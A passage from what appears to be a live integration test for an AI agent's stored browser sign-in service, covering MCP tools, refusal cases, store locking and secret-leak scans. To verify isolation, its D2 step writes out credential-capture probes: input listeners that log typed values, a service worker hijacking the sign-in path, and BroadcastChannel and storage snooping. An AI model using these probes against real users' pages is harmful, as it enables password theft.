  const local = await mcpClient("live-1", TOKEN_L, [{ name: "browser_sign_ins", arguments: {} }, { name: "browser_sign_in", arguments: { name: "staging" } }, { name: "browser_sign_in", arguments: { name: "missing" } }]);
  check("the local MCP client (scope live-1) connects, and its tools/list holds browser_sign_in and browser_sign_ins", !local.error && local.tools.includes("browser_sign_in") && local.tools.includes("browser_sign_ins"), local.error ?? `${local.tools.length} tools`);
  const listed = local.results[0];
  check("browser_sign_ins gives the store's state and the credential's name and origin, and no other field", !listed.isError && listed.content.length === 1 && listed.content[0].text === JSON.stringify({ state: "open", signIns: [{ name: "staging", origin: ORIGIN }] }), JSON.stringify(listed));
  const signed = local.results[1];
  check("browser_sign_in signs in: C11's success text", !signed.isError && signed.content.length === 1 && signed.content[0].text === `Signed in to ${ORIGIN}. Your tabs of this site were closed for the sign-in; open the site again: it loads signed in.`, JSON.stringify(signed));
  const missing = local.results[2];
  check("browser_sign_in of another name gets C11's text as the tool's error", missing.isError === true && missing.content[0].text === "Not signed in: There is no stored sign-in named missing for this repo.", JSON.stringify(missing));
  await until("the MCP act's events", () => signInEvents().length >= ev0 + 3, 30_000);
  const mcpEvents = signInEvents().slice(ev0);
  const mcpStart = mcpEvents.find((e) => e.phase === "start"), mcpEnd = mcpEvents.find((e) => e.phase === "end" && e.result === "signed_in");
  check("the MCP act's sign_in events: a start and an end (signed_in) of scope live-1 with one act id, and one refusal end (no_such_name)", !!mcpStart && mcpEnd?.act === mcpStart.act && mcpEnd.scope === "live-1" && mcpEvents.some((e) => e.phase === "end" && e.result === "no_such_name" && e.scope === "live-1"), JSON.stringify(mcpEvents.map((e) => [e.phase, e.scope, e.result ?? null])));
  check("the MCP act signed in at the site (one new session of the site)", signIns.length === sid0 + 1, `${signIns.length - sid0} new`);
  const t3 = await open(`${ORIGIN}/home`);
  check("after the MCP act the client's new tab of the site is signed in, with the session of the MCP act (the move)", (await text(t3.sessionId)) === "signed in" && homes[homes.length - 1] === signIns[signIns.length - 1]);
  // The remote stand-in: live-2's root is its MCP client (a child), and the service gives its requests the word remote.
  const ev1 = signInEvents().length, log1 = serviceErr.length, sid1 = signIns.length;
  const remote = await mcpClient("live-2", TOKEN_R, [{ name: "browser_sign_in", arguments: { name: "staging" } }, { name: "browser_sign_ins", arguments: {} }], async (pid) => {
    const r = await req(d, "set_sessions", DAEMON, { sessions: [LIVE_1, { scope: "live-2", repo: "local/test", roots: [{ pid, start: proc(pid)!.start }], cgroup: null, lifetime_id: "lt-live-2", mcp_token: fp(TOKEN_R) }], remote: [], box: BOX });
    if (!r.ok) throw new Error(`set_sessions with live-2: ${JSON.stringify(r)}`);
  });
  check("the remote stand-in's MCP client (scope live-2) connects, and its tools/list holds neither tool", !remote.error && remote.tools.length > 0 && !remote.tools.includes("browser_sign_in") && !remote.tools.includes("browser_sign_ins"), remote.error ?? remote.tools.join(","));
  const REMOTE_TEXT = "Not signed in: Stored sign-ins work only for sessions of this box.";
  check("the remote browser_sign_in and browser_sign_ins each get check 1's text as the tool's error", remote.results.length === 2 && remote.results.every((x: any) => x.isError === true && x.content.length === 1 && x.content[0].text === REMOTE_TEXT), JSON.stringify(remote.results));
  await sleep(1000);
  const tail = serviceErr.slice(log1);
  const remoteEvents = signInEvents().slice(ev1);
  const rEnd = remoteEvents[0];
  check("the remote browser_sign_in sent check 1's one refusal end: result remote, scope live-2, an act id of its own, no start, no credential", remoteEvents.length === 1 && rEnd.phase === "end" && rEnd.result === "remote" && rEnd.scope === "live-2" && /^[0-9a-f]{16}$/.test(rEnd.act) && rEnd.id === null && rEnd.name === null && rEnd.origin === null && !d.lines.some((l) => l.t === "ev" && l.ev === "sign_in" && l.phase === "start" && l.act === rEnd.act), JSON.stringify(remoteEvents));
  check("browser_sign_ins sent no event, and no remote call signed in at the site (no new session)", signIns.length === sid1, `${signIns.length - sid1} new`);
  check("the act's log line of the remote call names no credential: result remote", new RegExp(`sign-in: act ${rEnd?.act}: user [^,]*, scope live-2, repo local/test, no credential, result remote, `).test(tail), tail.match(/sign-in: act [0-9a-f]+: .*scope live-2.*/)?.[0]?.slice(0, 160) ?? "no line");
  check("the service logged the MCP path's line of each remote refusal", tail.includes("mcp: MCP session") && tail.includes("(scope live-2): a tools/call of browser_sign_in refused (a remote admission)") && tail.includes("(scope live-2): a tools/call of browser_sign_ins refused (a remote admission)"));
  check("no MCP line of the log holds a connection token or its fingerprint", ![TOKEN_L, TOKEN_R, fp(TOKEN_L), fp(TOKEN_R)].some((t) => serviceErr.includes(t)));

  // D2 (board ab-v16.97.6): the agent's reads of the design's section 4.2 on its own tabs during and after an act, and the
  // same-origin channels of round 1's case K1. Its tab A of the sign-in page has every domain on, a main-world listener, an
  // isolated-world init script and a window reference, made before the fill; its tab B listens on the K1 channels and
  // registers its cache-first service worker at the sign-in path; its tab C (the contrast) shows that the worker and the
  // channels are live in the default context.
  await designStep("D2 the agent's reads during and after an act", async () => {
    const reads: { what: string; at: number; out: string }[] = [];
    const evs: { m: string; at: number; out: string }[] = [];
    const record = (what: string, out: unknown) => { const s = typeof out === "string" ? out : JSON.stringify(out) ?? "undefined"; seen.push(s); reads.push({ what, at: Date.now(), out: s }); return s; };
    const offs: (() => void)[] = [];
    for (const m of ["DOM.attributeModified", "DOM.setChildNodes", "DOM.childNodeInserted", "DOM.characterDataModified", "Network.requestWillBeSent", "Network.responseReceived",
      "Network.webSocketCreated", "Fetch.requestPaused", "Runtime.bindingCalled", "Runtime.consoleAPICalled", "Page.frameNavigated", "Page.windowOpen"]) {
      offs.push(c.on(m, (p, sid) => {
        const s = JSON.stringify({ m, p, sid });
        seen.push(s);
        evs.push({ m, at: Date.now(), out: s });
        if (m === "Fetch.requestPaused") void c.send("Fetch.continueRequest", { requestId: p.requestId }, sid).catch(() => {});
      }));
    }
    // Each read waits at most 5 s: the move closes the agent's tabs of the site while the reads run.
    const ev = (sid: string, e: string) => c.send("Runtime.evaluate", { expression: e, returnByValue: true, awaitPromise: true, userGesture: true }, sid, 5000).then((r: any) => r.result?.value, (err: Error) => `error: ${err.message}`);
    const tryRead = async (what: string, f: () => Promise<unknown>) => record(what, await f().catch((err: Error) => `error: ${err.message}`));
    const titled = async (sid: string, want: string) => { for (let i = 0; i < 50; i++) { if ((await ev(sid, "document.title")) === want) return true; await sleep(200); } return false; };
    const k1Calls = () => evs.filter((e) => e.m === "Runtime.bindingCalled" && JSON.parse(e.out).p.name === "awK1").map((e) => ({ at: e.at, payload: String(JSON.parse(e.out).p.payload) }));

    // Tab A: the agent's own tab of the sign-in page, every domain of section 4.2 on before the fill.
    const A = await open(`${ORIGIN}/login`);
    for (const m of ["Runtime.enable", "Page.enable", "DOM.enable", "Network.enable", "Accessibility.enable"]) await c.send(m, {}, A.sessionId).catch((e: Error) => record(`A ${m}`, `error: ${e.message}`));
    await c.send("Page.addScriptToEvaluateOnNewDocument", { source: `document.addEventListener("input", (e) => { document.documentElement.dataset.awIso = (document.documentElement.dataset.awIso || "") + "|" + e.target.value; }, true);`, worldName: "aw-agent-iso" }, A.sessionId)
      .catch((e: Error) => record("A Page.addScriptToEvaluateOnNewDocument", `error: ${e.message}`));
    await c.send("Page.reload", {}, A.sessionId).catch(() => {});
    await sleep(1000);
    await titled(A.sessionId, "aw-live-sign-in-page");
    await c.send("DOM.getDocument", { depth: -1 }, A.sessionId).catch(() => {});
    await c.send("Fetch.enable", { patterns: [{ urlPattern: "*", requestStage: "Request" }] }, A.sessionId).catch((e: Error) => record("A Fetch.enable", `error: ${e.message}`));
    await c.send("Runtime.addBinding", { name: "awA" }, A.sessionId).catch((e: Error) => record("A Runtime.addBinding", `error: ${e.message}`));
    const armed = await ev(A.sessionId, `document.addEventListener("input", (e) => { try { awA("input:" + e.target.value); } catch (x) {} }, true); window.awRef = window.open("/login", "aw-ref"); window.awRef ? "armed" : "no reference"`);
    record("A the main-world listener and the window reference", armed);
    log(`D2 NOTE: tab A (the agent's own tab of the sign-in page): ${armed}`);
    // Tab B: the listener of the K1 channels, and the agent's service worker at the sign-in path.
    const B = await open(`${ORIGIN}/k1`);
    await c.send("Runtime.enable", {}, B.sessionId).catch(() => {});
    await c.send("Runtime.addBinding", { name: "awK1" }, B.sessionId).catch((e: Error) => record("B Runtime.addBinding", `error: ${e.message}`));
    await titled(B.sessionId, "aw-k1-listener");
    const sw = await ev(B.sessionId, `(async () => {
      const say = (s) => { try { awK1(s); } catch (e) {} };
      new BroadcastChannel("aw-k1").onmessage = (e) => say("bc:" + e.data);
      addEventListener("storage", (e) => say("storage:" + e.key + "=" + e.newValue));
      navigator.serviceWorker.onmessage = (e) => say("sw-msg:" + e.data);
      const r = await navigator.serviceWorker.register("/k1-sw.js", { scope: "/login" });
      for (let i = 0; i < 100 && !(r.active && r.active.state === "activated"); i++) await new Promise((t) => setTimeout(t, 100));
      return r.active ? r.active.state : "none";
    })()`);
    // Tab C, the contrast: the worker serves the agent's page at the sign-in path, and its typed value reaches B twice.
    const C = await open(`${ORIGIN}/login`);
    await c.send("Runtime.enable", {}, C.sessionId).catch(() => {});
    const served = await titled(C.sessionId, "aw-k1-agent-page");
    await ev(C.sessionId, `(() => { const i = document.querySelector("input[type=password]"); i.value = "contrast-k1-value"; i.dispatchEvent(new Event("input")); return 1; })()`);
    // The worker's own message to the listener ("sw-msg:") is a note only; its log in Cache Storage is the check (after the act).
    const live = () => ["bc:contrast-k1-value", "storage:aw-k1-typed=contrast-k1-value"].every((x) => k1Calls().some((k) => k.payload === x));
    await until("the contrast's messages", live, 10_000).catch(() => {});
    verify("D2 K1 contrast (one context): the agent's cache-first service worker (scope /login) served its own page at the sign-in path, and its listener tab got the contrast value by BroadcastChannel and by the storage event",
      sw === "activated" && served && live(), `worker ${sw}; served ${served}; ${JSON.stringify(k1Calls().map((k) => k.payload))}`);

    // During the act: the reads on A, B and C, the browser's targets and contexts, and the window search.
    const own = new Set(((await c.send("Target.getTargets")).targetInfos as any[]).map((t) => t.targetId));
    await c.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: true }).catch((e: Error) => record("Target.setAutoAttach", `error: ${e.message}`));
    const readJs = `JSON.stringify({ values: [...document.querySelectorAll("input")].map((i) => i.value), attrs: [...document.querySelectorAll("input")].map((i) => i.getAttribute("value")),
      local: Object.entries(localStorage), session: Object.entries(sessionStorage), iso: document.documentElement.dataset.awIso || "",
      ref: (() => { try { return window.awRef ? [...window.awRef.document.querySelectorAll("input")].map((i) => i.value) : null; } catch (e) { return "error: " + e.message; } })() })`;
    const windows: any[] = [];
    let going = true, rounds = 0, actOpen = 0;
    const tgt0 = events.length;
    const loop = (async () => {
      while (going) {
        const looked = xWindows().some((w) => /aw-live-sign-in-page/.test(w.name) && w.x >= 1280);
        for (const [tab, t] of [["A", A], ["B", B], ["C", C]] as const) {
          if (!going) break;
          await tryRead(`${tab} Runtime.evaluate (the fields' values and value attributes, localStorage, sessionStorage, the isolated world's record, the window reference)`, () => ev(t.sessionId, readJs));
          await tryRead(`${tab} DOMSnapshot.captureSnapshot`, () => c.send("DOMSnapshot.captureSnapshot", { computedStyles: [] }, t.sessionId, 5000));
          await tryRead(`${tab} DOM.getOuterHTML`, async () => { const doc = await c.send("DOM.getDocument", { depth: -1 }, t.sessionId, 5000); return c.send("DOM.getOuterHTML", { nodeId: doc.root.nodeId }, t.sessionId, 5000); });
          await tryRead(`${tab} Accessibility.getFullAXTree`, () => c.send("Accessibility.getFullAXTree", {}, t.sessionId, 5000));
        }
        await tryRead("Target.getTargets", () => c.send("Target.getTargets", {}, undefined, 5000));
        await tryRead("Target.getBrowserContexts", () => c.send("Target.getBrowserContexts", {}, undefined, 5000));
        await tryRead("Browser.getWindowForTarget of A", () => c.send("Browser.getWindowForTarget", { targetId: A.targetId }, undefined, 5000));
        for (let id = 1; id <= 12 && going; id++) { const w = await c.send("Browser.getWindowBounds", { windowId: id }, undefined, 5000).catch(() => null); if (w) { windows.push({ id, ...w.bounds }); record(`Browser.getWindowBounds ${id}`, w); } }
        rounds++;
        if (looked && xWindows().some((w) => /aw-live-sign-in-page/.test(w.name) && w.x >= 1280)) actOpen++;
        await sleep(300);
      }
    })();
    const k1n = k1Calls().length;
    const from = Date.now();
    const signed = await c.send("AgentBrowser.signIn", { name: "staging" }, undefined, 240_000).catch((e: Error) => ({ error: e.message }));
    const to = Date.now(), tgt1 = events.length;
    going = false;
    await loop;
    seen.push(JSON.stringify(signed));
    verify("D2: the act with the agent's reads answers signed in", (signed as any).signedIn === true, JSON.stringify(signed));
    const during = reads.filter((r) => r.at >= from && r.at <= to);
    const kind = (r: { what: string }) => r.what.replace(/^[ABC] /, "").replace(/ \d+$/, "");
    const kinds = [...new Set(during.map(kind))].map((k) => `${k}: ${during.filter((r) => kind(r) === k && !r.out.startsWith("error")).length} of ${during.filter((r) => kind(r) === k).length} answered`);
    verify(`D2: during the act the agent read its own tabs in ${rounds} rounds (${during.length} reads), ${actOpen} of them while the act page's window was open (an X look before and after)`, rounds > 0 && actOpen > 0, kinds.join("; "));
    verify("D2: no read of the agent during the act got a test value (each read of section 4.2 on its tabs A, B and C, Target.getTargets, Target.getBrowserContexts, the window search)", !during.some((r) => holds(r.out)), `${during.filter((r) => holds(r.out)).map((r) => r.what).join(", ")}`);
    verify("D2: no event of the agent's sessions got a test value (DOM.attributeModified, Network.requestWillBeSent, Fetch.requestPaused, Runtime.bindingCalled, Runtime.consoleAPICalled, Page.windowOpen)", !evs.some((e) => holds(e.out)), `${evs.length} events`);
    verify("D2: the agent's Network and Fetch saw no post of the sign-in (the act's submit)", !evs.some((e) => /^(Network\.requestWillBeSent|Fetch\.requestPaused)$/.test(e.m) && /"method":"POST"/.test(e.out)),
      `${evs.filter((e) => e.m === "Fetch.requestPaused").length} paused requests of its own tabs`);
    verify("D2 K1: the listener tab got no broadcast and no message of the service worker during the act", !k1Calls().some((k) => k.at >= from && /^(bc|sw-msg):/.test(k.payload)), JSON.stringify(k1Calls().slice(k1n).map((k) => k.payload)));
    const idsDuring = during.filter((r) => r.what === "Target.getTargets" && !r.out.startsWith("error")).flatMap((r) => (JSON.parse(r.out).targetInfos as any[]).map((t) => t.targetId));
    const tgtDuring = events.slice(tgt0, tgt1).map((e) => JSON.parse(e).p?.targetInfo?.targetId).filter((x) => typeof x === "string");
    verify("D2: the agent saw no target of the act: each target of Target.getTargets during the act and each Target event (Target.setAutoAttach on) is its own",
      [...idsDuring, ...tgtDuring].every((id) => own.has(id)) && !events.slice(tgt0, tgt1).some((e) => /aw-act-/.test(e)), `${idsDuring.length} ids, ${tgtDuring.length} events; not own: ${[...new Set([...idsDuring, ...tgtDuring].filter((id) => !own.has(id)))].join(", ")}`);
    verify("D2: the agent's window search (Browser.getWindowForTarget, Browser.getWindowBounds of the ids 1 to 12) found no window outside the screen", windows.every((w) => !(w.left >= 1280 || w.top >= 900)),
      `${windows.length} answers: ${JSON.stringify([...new Map(windows.map((w) => [w.id, w])).values()].slice(0, 4))}`);

    // After the act: the move closed the agent's tabs of the site; a new tab E reads the origin's storage, Cache Storage
    // (the worker's log of the fetches that it saw) and its page; history.back() on a tab F of the sign-in page.
    const E = await open(`${ORIGIN}/home`);
    for (const m of ["Runtime.enable", "DOM.enable", "Accessibility.enable"]) await c.send(m, {}, E.sessionId).catch(() => {});
    await text(E.sessionId);
    const store = await tryRead("E after: localStorage, sessionStorage and Cache Storage", () => ev(E.sessionId, `(async () => { const out = { local: Object.entries(localStorage), session: Object.entries(sessionStorage), caches: [] };
      for (const k of await caches.keys()) { const c = await caches.open(k); for (const r of await c.keys()) out.caches.push([k, r.url, await (await c.match(r)).text()]); } return JSON.stringify(out); })()`));
    const afterReads = [store];
    afterReads.push(await tryRead("E after: DOMSnapshot.captureSnapshot", () => c.send("DOMSnapshot.captureSnapshot", { computedStyles: [] }, E.sessionId)));
    afterReads.push(await tryRead("E after: DOM.getOuterHTML", async () => { const doc = await c.send("DOM.getDocument", { depth: -1 }, E.sessionId); return c.send("DOM.getOuterHTML", { nodeId: doc.root.nodeId }, E.sessionId); }));
    afterReads.push(await tryRead("E after: Accessibility.getFullAXTree", () => c.send("Accessibility.getFullAXTree", {}, E.sessionId)));
    let swLog: number[] = [];
    try { swLog = (JSON.parse(store).caches as string[][]).filter(([k]) => k === "aw-k1-log").map(([, u]) => Number(u.split("/k1-log/")[1])); } catch { /* the read failed: the check says so */ }
    verify("D2 K1: the agent's service worker saw the contrast's fetch of the sign-in path before the act, and no fetch during it (it lives in the default context only)", swLog.some((t) => t < from) && !swLog.some((t) => t >= from && t <= to), JSON.stringify(swLog.map((t) => t - from)));
    record("E unregister the agent's worker", await ev(E.sessionId, `navigator.serviceWorker.getRegistrations().then((rs) => Promise.all(rs.map((r) => r.unregister()))).then((x) => x.length + " gone")`));
    const F = await open(`${ORIGIN}/login`);
    await c.send("Runtime.enable", {}, F.sessionId).catch(() => {});
    const realPage = await titled(F.sessionId, "aw-live-sign-in-page");
    await c.send("Page.navigate", { url: `${ORIGIN}/home` }, F.sessionId).catch(() => {});
    await text(F.sessionId);
    await ev(F.sessionId, "history.back(), 1");
    const back = (await titled(F.sessionId, "aw-live-sign-in-page")) ? await tryRead("F after: history.back() to the sign-in page, its fields' values", () => ev(F.sessionId, `JSON.stringify([...document.querySelectorAll("input")].map((i) => i.value))`)) : "no page";
    afterReads.push(back);
    afterReads.push(await tryRead("Target.getTargets after the act", () => c.send("Target.getTargets")));
    verify("D2 after the act: the agent's new tab of the site (localStorage, sessionStorage, Cache Storage, its DOM snapshot, its HTML, its accessibility tree) holds no test value", afterReads.length === 6 && !afterReads.some(holds), `${afterReads.map((r) => r.length).join(", ")} bytes`);
    verify("D2 after the act: history.back() on the agent's tab of the sign-in page gives the page with empty fields", realPage && back === JSON.stringify(["", ""]), back);
    const leftTargets = afterReads[5].startsWith("error") ? [] : (JSON.parse(afterReads[5]).targetInfos as any[]);
    const path = (u: string) => { try { return new URL(u).pathname; } catch { return u; } };
    verify("D2 after the act: Target.getTargets holds no target of the act (no act page, no act window)", leftTargets.length > 0 && leftTargets.every((t) => !/aw-act-/.test(t.title ?? "") && (own.has(t.targetId) || [E.targetId, F.targetId].includes(t.targetId) || path(t.url) !== "/login")),
      leftTargets.map((t) => path(t.url)).join(", "));
    for (const off of offs) off();
    await c.send("Target.setAutoAttach", { autoAttach: false, waitForDebuggerOnStart: false, flatten: true }).catch(() => {});
    for (const t of [E, F]) await c.send("Target.closeTarget", { targetId: t.targetId }).catch(() => {});
  });

  // D3 (board ab-v16.97.6): each refusal of section 7.9 that the local site can make, with the design's text and C11's
  // result in the sign_in end. One record for each case (its page is /r/<case>); r-broken's file carries another record's
  // seal, so its tag does not open.
  await designStep("D3 the refusals of section 7.9", async () => {
    const cases = Object.keys(REFUSALS) as Case[];
    const idOf = new Map<string, string>();
    const files: Record<string, unknown>[] = [];
    for (const [i, k] of cases.entries()) {
      const rec = { id: `c-0000b${String(i).padStart(3, "0")}`, name: REFUSALS[k].name, origin: ORIGIN, path: `/r/${k}`, send_to: k === "offsend" ? [ORIGIN, `http://offsend.localhost:${port}`] : [ORIGIN] };
      const values = k === "slow" ? { username: R_LONG_USER, password: R_LONG_PASS } : { username: R_USER, password: R_PASS };
      const a = await req(d, "sign_in_seal", OPERATOR, { record: rec, offer: false, sealed: paneSeal(paneKey, values, { op: "sign_in_seal", record: rec, offer: false }, { at: at() }) });
      if (a.ok !== true) throw new Error(`sign_in_seal of ${rec.name}: ${JSON.stringify(a).slice(0, 200)}`);
      idOf.set(rec.name, rec.id);
      files.push({ ...a.data.record, state: "usable", added: null, changed: null, sealed: k === "broken" ? file.sealed : a.data.sealed });
    }
    allFiles = [file, ...files];
    check(`D3: the snapshot with the ${files.length} records of the refusals (each sealed with the pane's seal)`, (await req(d, "sign_ins", DAEMON, { key: setup.data.key, records: allFiles })).ok === true);
    const ends = () => d.lines.filter((l) => l.t === "ev" && l.ev === "sign_in" && l.phase === "end");
    /** One act of `name` on the client `cc`: the CDP error's code and text, and the act's end event. */
    const act = async (name: string, cc = c) => {
      const e0 = ends().length, id = idOf.get(name);
      const r = await cc.send("AgentBrowser.signIn", { name }, undefined, 240_000).then((ok: unknown) => ({ ok, code: 0, message: "" }), (e: CDPError) => ({ ok: null, code: e.code ?? 0, message: e.message }));
      seen.push(JSON.stringify(r));
      await until(`the end of ${name}`, () => ends().slice(e0).some((x) => x.id === id), 10_000).catch(() => {});
      return { ...r, end: ends().slice(e0).find((x) => x.id === id) ?? null };
    };
    const expect = (label: string, r: Awaited<ReturnType<typeof act>>, result: keyof typeof TEXT) => verify(`D3 ${result}${label}: the agent gets "Not signed in: ${TEXT[result]}" (CDP error -32000), and the sign_in end has the result ${result}`,
      r.code === -32000 && r.message === `AgentBrowser.signIn: Not signed in: ${TEXT[result]}` && r.end?.result === result, `${r.message || JSON.stringify(r.ok)}; end ${r.end?.result ?? "none"}`);
    for (const k of ["offsend", "broken", "other"] as const) expect(` (${REFUSALS[k].name})`, await act(REFUSALS[k].name), REFUSALS[k].result);
    // r-twopw: six acts start (password_fields), and the seventh gets the hour's limit.
    for (let i = 1; i <= 6; i++) expect(` (r-twopw, act ${i} of the hour)`, await act("r-twopw"), "password_fields");
    expect(" (r-twopw, the seventh act in the hour)", await act("r-twopw"), "hour_limit");
    for (const k of ["noform", "target", "socket", "popup", "type"] as const) expect(` (${REFUSALS[k].name})`, await act(REFUSALS[k].name), REFUSALS[k].result);
    verify("D3: the open connection's page had its WebSocket to tracker.localhost open (the handshake answered)", stats.handshakes > 0, `${stats.handshakes} handshakes`);
    // r-wrong: three acts not accepted, then stopped.
    for (let i = 1; i <= 3; i++) expect(` (r-wrong, ${i} of 3)`, await act("r-wrong"), "not_accepted");
    expect(" (r-wrong, after three not accepted)", await act("r-wrong"), "stopped");
    verify("D3: status names r-wrong's credential as stopped", ((await req(d, "status", DAEMON)).data.sign_ins.stopped as string[]).includes(idOf.get("r-wrong")!));
    for (const k of ["twofa", "offlist", "leak"] as const) expect(` (${REFUSALS[k].name})`, await act(REFUSALS[k].name), REFUSALS[k].result);
    // r-slow (its page's load takes 27 s and its post never answers) runs; r-busy, on a second client of the scope, waits 60 s.
    const c2 = await CDPConnection.connect((await req(d, "endpoint", DAEMON, { scope: "live-1" })).data.url as string, 5000);
    try {
      const slow = act("r-slow");
      await d.next((l) => l.t === "ev" && l.ev === "sign_in" && l.phase === "start" && l.id === idOf.get("r-slow"), 60_000);
      const t0b = Date.now();
      const busy = await act("r-busy", c2);
      expect(` (r-busy, after ${Math.round((Date.now() - t0b) / 1000)} s behind r-slow)`, busy, "busy");
      expect(" (r-slow)", await slow, "timeout");
    } finally { await c2.close(); }
    verify("D3: no request of the tracker host during the refusals holds a test value", !tracker.some((r) => holds(r.path) || holds(r.body)));
  });

  // D7 (board ab-v16.97.6): a restart of the service: the store is locked; a wrong test passphrase does not open it; the
  // test unlock (the pane's seal of the test passphrase) opens it, and an act signs in again.
  await designStep("D7 a restart of the service", async () => {
    await c.close();
    check("D7: stop answers ok before the restart (Chrome stops)", (await req(d, "stop", TOKEN, {}, 30_000)).ok === true);
    d.s.end();
    await stopService();
    const old = service;
    check("D7: the service ended on SIGTERM", !!old && (old.exitCode !== null || old.signalCode !== null), `exit ${old?.exitCode}, signal ${old?.signalCode}`);
    await until("the display's X lock is gone", () => !existsSync(`/tmp/.X${display}-lock`), 30_000);
    const from = serviceErr.length;
    d = await startService();
    const snap = await req(d, "sign_ins", DAEMON, { key: setup.data.key, records: allFiles });
    const st = (await req(d, "status", DAEMON)).data.sign_ins;
    check("D7: after the restart and the daemon's snapshot (the same key and records), the store is locked", snap.ok === true && st.state === "locked", `state ${st.state}, ${st.records} records`);
    const a2 = await req(d, "start", TOKEN, {}, 120_000);
    check("D7: start answers ok after the restart", a2.ok === true, JSON.stringify(a2));
    const ready2 = await d.next((l) => l.t === "ev" && l.ev === "ready", 120_000);
    track(ready2.chrome_pid, "chrome");
    track(JSON.parse(readFileSync(join(state, "unit.json"), "utf8")).xvfb_pid, "xvfb");
    await until("the receiver confirms the lists after the restart", () => /lists: the receiver took the lists of 1 scopes/.test(serviceErr.slice(from)), 60_000);
    const url2 = (await req(d, "endpoint", DAEMON, { scope: "live-1" })).data.url as string;
    let next: CDPConnection | null = null;
    for (let i = 0; i < 50 && !next; i++) { try { next = await CDPConnection.connect(url2, 5000); } catch (e) { if (i === 49) throw e; await sleep(200); } }
    c = next!;
    const locked = await c.send("AgentBrowser.signIn", { name: "staging" }, undefined, 240_000).then((ok: unknown) => ({ code: 0, message: JSON.stringify(ok) }), (e: CDPError) => ({ code: e.code ?? 0, message: e.message }));
    seen.push(locked.message);
    verify(`D7: an act while the store is locked gets "Not signed in: ${TEXT.locked}"`, locked.code === -32000 && locked.message === `AgentBrowser.signIn: Not signed in: ${TEXT.locked}`, locked.message);
    const paneKey2 = st.pane_key as string;
    const wrong = await req(d, "sign_ins_unlock", OPERATOR, { sealed: paneSeal(paneKey2, { passphrase: "a wrong test passphrase of the live check" }, { op: "sign_ins_unlock" }, { at: at() }) }, 60_000);
    verify("D7: the unlock with a wrong test passphrase gets C12's text, and the store stays locked", wrong.ok !== true && JSON.stringify(wrong).includes("the passphrase does not open the store") && (await req(d, "status", DAEMON)).data.sign_ins.state === "locked", JSON.stringify(wrong).slice(0, 160));
    const un = await req(d, "sign_ins_unlock", OPERATOR, { sealed: paneSeal(paneKey2, { passphrase: PASSPHRASE }, { op: "sign_ins_unlock" }, { at: at() }) }, 60_000);
    check("D7: the test unlock (the pane's seal of the test passphrase) opens the store", un.ok === true && (await req(d, "status", DAEMON)).data.sign_ins.state === "open", JSON.stringify(un).slice(0, 160));
    const again = await c.send("AgentBrowser.signIn", { name: "staging" }, undefined, 240_000).catch((e: Error) => ({ error: e.message }));
    seen.push(JSON.stringify(again));
    check("D7: after the unlock an act signs in again", (again as any).signedIn === true, JSON.stringify(again));
    const t4 = await open(`${ORIGIN}/home`);
    verify("D7: the client's new tab of the site is signed in after that act (the move)", (await text(t4.sessionId)) === "signed in");
  });

  // 8. The secret scan, with its twin.
  check("the scan's twin finds a planted test value", holds(`x ${Buffer.from(PASS).toString("base64url")} y`));
  check("no control line, answer, event, client message, CLI output or MCP result holds a test value", !seen.some(holds));
  check("no log line of the service holds a test value", !holds(serviceErr));
  const bytes = forms.map((f) => Buffer.from(f, "utf8"));
  const profileHits: string[] = [];
  const walk = (p: string) => {
    for (const e of readdirSync(p, { withFileTypes: true })) {
      const f = join(p, e.name);
      if (e.isDirectory()) walk(f);
      else if (e.isFile() && statSync(f).size < 64 << 20) { const b = readFileSync(f); if (bytes.some((x) => b.includes(x))) profileHits.push(f.slice(state.length)); }
    }
  };
  walk(join(state, "profile"));
  check("no file of the profile holds a test value (History, Login Data, Web Data, Cookies, Local Storage, Preferences)", profileHits.length === 0, profileHits.join(", "));

  // 9. Stop.
  await c.close();
  const st = await req(d, "stop", TOKEN, {}, 30_000);
  check("stop answers ok", st.ok === true);
  d.s.end();
  await stopService();
} catch (e) {
  code = 1;
  log(`FAIL: ${(e as Error).message}`);
  if (serviceErr) log(`the service's log (end):\n${serviceErr.slice(-4000).split("\n").filter((l) => !CANARIES.some((v) => l.includes(v))).join("\n")}`);
} finally {
  // The design steps: one line each; a failed one keeps its evidence, the act's lines of the service's log.
  for (const s of designSteps) log(`design step ${s.name}: ${s.ok ? "PASS" : "FAIL"} (${s.note})`);
  if (designSteps.some((s) => !s.ok)) {
    code = 1;
    log(`the service's sign-in lines (the evidence):\n${serviceErr.split("\n").filter((l) => /sign-in|sign_in|act_/.test(l) && !CANARIES.some((v) => l.includes(v))).slice(-80).join("\n")}`);
  }
  for (const t of held) clearTimeout(t);
  for (const s of sockets) s.destroy();
  await stopService();
  http.close();
  for (const sig of ["SIGTERM", "SIGKILL"] as const) {
    for (const [pid, start] of started) if (proc(pid)?.start === start) { try { process.kill(pid, sig); } catch {} }
    await sleep(2000);
  }
  const left = [...started].filter(([pid, start]) => proc(pid)?.start === start).map(([pid]) => pid);
  repo?.close();
  rmSync(dir, { recursive: true, force: true });
  log(`cleanup: ${left.length ? `still running: ${left.join(", ")}` : "no process of this run runs"}; the temp folder is ${existsSync(dir) ? "still there" : "removed"}`);
  if (left.length) code = 1;
  process.stdout.write(`${JSON.stringify({ passed: results.filter((r) => r.ok).length, failed: results.filter((r) => !r.ok).length + (code && results.every((r) => r.ok) ? 1 : 0), seconds: Math.round((Date.now() - t0) / 1000) })}\n`);
  process.exit(code);
}
